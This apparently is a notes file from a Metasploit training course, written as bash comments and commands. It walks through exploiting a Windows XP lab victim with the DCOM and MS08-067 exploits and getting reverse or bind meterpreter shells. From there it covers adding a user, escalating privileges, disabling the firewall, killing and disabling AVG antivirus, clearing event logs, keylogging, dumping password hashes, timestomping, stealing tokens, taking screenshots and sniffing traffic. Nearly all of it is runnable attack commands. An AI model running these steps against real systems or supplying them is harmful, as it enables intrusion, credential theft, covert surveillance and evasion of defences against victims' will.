#!/bin/bash

#-----------------------------------------------#
#	metasploit course
#-----------------------------------------------#


#-----------------------------------------------#
# nmap scan
#-----------------------------------------------#

# scan subnet
nmap -v -sP 192.168.1.0/24

# scan for targets with nmap
nmap -v -n 192.168.1.50

#-----------------------------------------------#
#	check for service vulnerabiltes
#-----------------------------------------------#

# see if there is a vulnerabilty for the service scanned with nmap
# download the exploit for the vulnerabilty

# compile the exploit code
gcc dcom.c -o dcom

# run the exploit with out any arguments to see the options
./dcom


# run the exlploit with argument
./dcom 5 192.168.1.150

# when the exploit runs you get a remote shell on the victim

# victim machine
# you can check you are connected to the  windows xp by running netstat -n on the windows machine
netstat -n

# attacker machine
# check the remote shell ip address
ipconfig

# attacker machine remote shell, run commands
# cd = change dir
cd

# dir to list files and folders
dir

# type command works like cat on unix, use to see the contents of a file
type somefile.txt


# what happens when you exit the remote shell
exit

# if the exploit doesnt clean up after itself you may get an alert on victim computer

#-----------------------------------------------#

# portscan with msf

use auxiliary/scanner/portscan/tcp

show options

set PORTS 1-500

set RHOST 192.168.1.150

set THREADS 10

run

#-----------------------------------------------#

# find exploits

# go back to previous shell
back

# search for exploits
search dcom


#-----------------------------------------------#

# use the exploit

use exploit/windows/dcerpc/ms03_026_dcom

show options

set RHOST 192.168.1.150

# change the local listening port from default 4444 to something else
set LPORT 6000

set PAYLOAD windows/shell_bind_tcp

# run the exploit
exploit


# you should get a command prompt

# exit when done
exit

# abort sessions
y

#-----------------------------------------------#

# different payloads

# add user

set PAYLOAD windows/adduser

exploit


#-----------------------------------------------#
#	Meterpreter
#-----------------------------------------------#


search netapi

use exploit/windows/smb/ms08_067_netapi

show options

set RHOSTS to 192.168.1.150

# set the payload to meterpreter reverse_tcp
set PAYLOAD windows/meterpreter/reverse_tcp

show options

# set attacker ip
set LHOST 192.168.1.10

# run the exploit
exploit


# you should get an meterpreter shell prompt if the exploit worked

# type ? (question mark) at the meterpreter shell prompt to get a list of options
?

# show information about the system
sysinfo

# show process id
getpid

# show access privilges on system
getuid

# show all processes
ps

#-----------------------------------------------#

# go to the metaploit directory on backtrack
cd /pentest/exploits/metasploit

# usefull dirs

# modules dir
cd modules

# external librarys
cd external

# data dir with wordlists
cd data

# scripts dir
cd scripts

# tools dirs
cd tools

# plugins dir
cd plugins


#-----------------------------------------------#
# update metaploit framework
#-----------------------------------------------#

# run the command msfupdate to update metasploit
msfupdate


#-----------------------------------------------#
# post exploitation
#-----------------------------------------------#

# understanding the victim better

# after exploiting the machine

# find out about the system by running sysinfo
sysinfo

# find your privilege on the remote sytem by running getuid
getuid

# get process id of our process
getpid

# show all process
ps

# find out if the user is active on the machine
idletime
# user has been idle x seconds

# check if the user is running on a virtual machine,
# or actual hardware with Meterpreter script post exploitation
run checkvm

# Meterpreter get enviorment script
run get_env

# get ip info about the system
ipconfig

# get the routing tables
route

# get a list of installed application
run get_application_list

# get hashes and other info about remote system
run scrapper

# scrapper dir
cd ./msf4/logs/scripts/scrapper/ip-address-goes-here


# winenum get system info
run winenum

# winenum dir
cd ./msf4/logs/scripts/winenum/ip-address-goes-here


#-----------------------------------------------#
#	privilege escalation
#-----------------------------------------------#

# victim is running a vunerable app called minishare

# search for an exploit
search minishare

# use the exploit
use exploit/windows/http/minishare_get_overflow

# set the options
set RHOST 192.168.1.150

# show target options
show targets

# set the target
set TARGET 2

# run the exploit
exploit

# you should get a Meterpreter shell prompt on the remote vicitim machine

# check the uid you are logged in under
getuid


# elevate user privilege with getsystem

# getsystem -h = help for command
getsystem -h

# run the different attacks one after another to try and get system privileges
getsystem -t 0


# check if you got system privileges by running getuid to find your uid
getuid

# revert the privileges back to the privileges you originally had
rev2self

#-----------------------------------------------#
#	migrate into process
#-----------------------------------------------#

# get system privileges
getsystem


# do a ps to find runnning processes pid
ps

# migrate to another process with the same or lower privileges by using the process id
migrate 1908


#-----------------------------------------------#
#	kill anti virus and disable the firewall
#-----------------------------------------------#


# run previous exploit ( netapi )
exploit

# check if the firewall is running
# get a command prompt on the remote machine with the execute command
execute -f cmd.exe -c -H


# -f cmd.exe = reun executable
# -c = run command asyncrononously
# -H = run the command hidden so it doesnt pop up on victim machine

# it will output the process and channel in the console

# interact
interact 1

# 1 = channel 


# you now have a command prompt

#-----------------------------------------------#
#	disable the firewall
#-----------------------------------------------#

# run ipconfig to find the lan ip address
ipconfig

# check if the firewall is running
netsh firewall show opmode


# check if the operation mode is enabled

# disable the firewall remotely
netsh firewall set opmode mode= DISABLE

# you may get a pop up on the victim machine saying the firewall is disabled

# exit the command prompt and go back to the meterpreter shell
exit

#-----------------------------------------------#
#	disable the anti virus
#-----------------------------------------------#


# kill the antivrus with killav ( doesnt work properly )
run killav

# create a command prompt
execute -f cmd.exe -c -H

# interact
interact 2

# find the current programs or task running on the victim
tasklist

# find the anti virus process
# avg anti virus usually has a avg prefix ( avgemcx.exe )

# show process spwaned by services ( eg anti virus )
tasklist /SVC

# show only the anti virus processes
tasklist /SVC | find /I "avg"

# this should show all the avg anti virus processes

# show options for killing the processes
taskkill /?

# use a wildcard to kill the avg anti virus processes
taskkill /F /IM "avg*"

# /F = force
# /IM = image name
# "avg*" = avg and * wildcard


# may show some process have not been killed

# verify running processes
tasklist /SVC | find /I "avg"

# this may show that the avg watchdog has restarted the processes you killed

# just stop the avg watchdog
net stop avgwd

# fails with - the request pause or stop is not valid for this service

# view the attributes of the avgwd watchdog service
sc queryex avgwd

# sc = service configuration manger

# query the other avg service
sc queryex AVGIDSAgent

# in the output it show the serive is running
# it also show its 0 NOT_STOPPABLE, NOT_PAUSEABLE, ACCEPTS_SHUTDOWN

# disable the service so next time the computer reboots it wont be started

# disable the avgwd = avg watchdog
sc config avgwd start= disabled

# disable the other avg service
sc config AVGIDSAgent start= disabled

# remotely restart the victim computer so the avg service dont run when it boots up 

# exit the shell prompt and return to the meterpreter shell
exit

# reboot
reboot

# log back in after the reboot by running the exlpoit again
exploit

# get a shell
execute -f cmd.exe -c -H

# interact with the shell
interact 1

# run task list to see the running processes and check for avg
tasklist /SVC | find /I "avg"

# should show the watchdog is disabled

# use a wildcard to kill the avg anti virus processes
taskkill /F /IM "avg*"

# /F = force
# /IM = image name
# "avg*" = avg and * wildcard

# run task list to see the running processes and check for avg
tasklist /SVC | find /I "avg"

# av should be killed

#-----------------------------------------------#
#	clear event logs to hide your activity
#-----------------------------------------------#

clearev


#-----------------------------------------------#
# 	collecting data
#-----------------------------------------------#


# at the meterpreter shell press ? for help
?

# load other exenstions with the load command
load 

# Stdapi commands list (ls)
ls

# cd change dir
cd c:\ 

# make dir
mkdir hacked

# make file - echo doesnt work so you have to create a shell
echo hacked > hacked.txt

# get a shell
execute -f cmd.exe -c -H

# interact with the channel (shell)
interact 1

# now you have a shell you can use echo
echo hacked > hacked.txt

# exit the shell
exit


#-----------------------------------------------#
#	uploading and downloading files
#-----------------------------------------------#


# download files
download hacked.txt

# should download to home dir on attacker machine

# upload files
upload hacked.txt

# edit files remotely
edit hacked.txt


#-----------------------------------------------#
#	understanding windows desktop
#-----------------------------------------------#


# session 0 = user desktop
# WinStd0

# keylogging

# get the desktop
getdesktop

# associate with the WinStd0 so you can keylog

# check running processes so you can migrate to that process
ps

# migrate to a process that has access to WinStd0 ( explorer.exe process pid )
migrate 1896

# 1896 = explorer.exe process pid 

# now get the desktop and you should be associated with WinStd0
getdesktop

#-----------------------------------------------#
#	key scanning ( key logging )
#-----------------------------------------------#


# start the keyscan on WinStd0 desktop
keyscan_start


# switch to the victim and oprn notepad and type in some text to a file

# switch back to the attacker machine
# run a keyscan_dump to dump the key logged text
keyscan_dump

# the exit is dumped to the console

# grab a remote screenshot - which is saved locally to your home dir
screenshot


#-----------------------------------------------#
# hashdump - dump passwords from sam database
#-----------------------------------------------#

hashdump


#-----------------------------------------------#

# change timestamps on files

# get timestomp help
timestomp -h

# change all 4 options on the timestamp
# format = mm/dd/yyyy HH24:MI:SS
timestomp hacked.txt -z "1/1/2022 11:11:11"


# check the timestamp values on a file
timestomp hacked.txt -v



#-----------------------------------------------#
#	token stealing and incognito extension
#-----------------------------------------------#

# every user is identified by a dis

# user process = primary token

# impersonation tokens
# delegation tokens


# break into the remote system by using an exploit
exploit

# at the meterpreter shell prompt load the incognito extension
load incognito 

# run the help command on the meterpreter shell - ?
meterpreter ?

# you should now have the incognito extension commands

# check access privileges
getuid

# if you have sytem privileges you can access all the tokens on the machine
list_tokens -u

# type shell to get a prompt
shell

# show username
echo %USERNAME%


# exit the shell
exit


# this wlll list all the impersonation and delegation tokens

# impersonate token
impersonate_token SMFE-VICTIM\\SecurityTube

# check access privileges
getuid

# type shell to get a prompt
shell

# show username
echo %USERNAME%

# the username should now match the username of the tokens you stole

# exit the shell
exit

# go back to privileges you had before you stole the token
rev2self

#-----------------------------------------------#
#	steal token
#-----------------------------------------------#

# steal_token prompts you for a process id
steal_token

# do ps to get processes ids
ps

# steal token based on process id
steal_token 2432

# find your user id, we didnt have to migrate to the process id
getuid

# drop the token
drop_token

#-----------------------------------------------#
#	taking screenshots
#-----------------------------------------------#

# exploit the remote machine
# get meterpreter shell

# load espia, to take screengrab ( have to make sure its WinStd0 )
load espia

# getuid
getuid

# getdesktop
getdesktop

# ps, get pid of explorer
ps

# migrate to process that has access to WinStd0
migrate 1792


# get the desktop, should now be WinStd0
getdesktop

# run the screengrab command
screengrab


#-----------------------------------------------#
#	sniffer extension
#-----------------------------------------------#

# load the sniffer extension
load sniffer

# show allowed devices to sniff from
sniffer_interfaces

# start the sniffer
sniffer_start 1 1024


# 1 = interface
# 1024 = packet buffer size


# get sniffer stats
sniffer_stats 1

# 1 = interface id


# save the sniffer to a dump on attacker machine
sniffer_dump 1 demo.pcap

# 1 = interface id
# demo.pcap = save to pcap file

# stop the sniffing
sniffer_stop 1








